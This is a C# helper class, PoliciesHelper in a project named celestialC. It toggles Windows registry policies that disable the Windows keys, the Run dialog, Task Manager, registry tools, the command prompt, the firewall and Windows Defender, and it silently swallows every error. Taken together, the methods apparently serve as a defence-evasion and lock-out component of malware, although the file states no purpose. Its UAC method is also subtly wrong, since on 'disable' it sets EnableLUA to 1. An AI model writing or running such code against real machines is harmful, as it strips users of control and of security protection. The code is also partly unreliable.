using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Helper
{
    public static class PoliciesHelper
    {
        public static void Winkeys(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                if (disable)
                    objRegistryKey.SetValue("NoWinKeys", 1);
                else
                    objRegistryKey.DeleteValue("NoWinKeys");
                objRegistryKey.Close();
            }
            catch { }
        }
        public static void Run(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                if (disable)
                    objRegistryKey.SetValue("NoRun", 1);
                else
                    objRegistryKey.DeleteValue("NoRun");
                objRegistryKey.Close();
            }
            catch { }
        }
        public static void TaskMGR(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (disable)
                    objRegistryKey.SetValue("DisableTaskMgr", 1);
                else
                    objRegistryKey.DeleteValue("DisableTaskMgr");
                objRegistryKey.Close();
            }
            catch { }
        }

        public static void RegistryTools(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (disable)
                    objRegistryKey.SetValue("DisableRegistryTools", 1);
                else
                    objRegistryKey.DeleteValue("DisableRegistryTools");
                objRegistryKey.Close();
            }
            catch { }
        }

        public static void CommandPrompt(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows\System");
                if (disable)
                    objRegistryKey.SetValue("DisableCMD", 2);
                else
                    objRegistryKey.DeleteValue("DisableCMD");
                objRegistryKey.Close();
            }
            catch { }
        }

        public static void UAC(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (disable)
                    objRegistryKey.SetValue("EnableLUA", 1);
                else
                    objRegistryKey.DeleteValue("EnableLUA");
                objRegistryKey.Close();
            }
            catch { }
        }

        public static void Firewall(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(
                @"System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile");
                if (disable)
                    objRegistryKey.SetValue("EnableFirewall", 0);
                else
                    objRegistryKey.SetValue("EnableFirewall", 1);
                objRegistryKey.Close();
            }
            catch { }
        }

        public static void WindowsDefender(bool disable)
        {
            try
            {
                RegistryKey objRegistryKey = Registry.LocalMachine.CreateSubKey(
                @"SOFTWARE\Policies\Microsoft\Windows Defender");
                if (disable)
                    objRegistryKey.SetValue("DisableAntiSpyware", 1);
                else
                    objRegistryKey.SetValue("DisableAntiSpyware", 0);
                objRegistryKey.Close();
            }
            catch { }
        }
    }
}
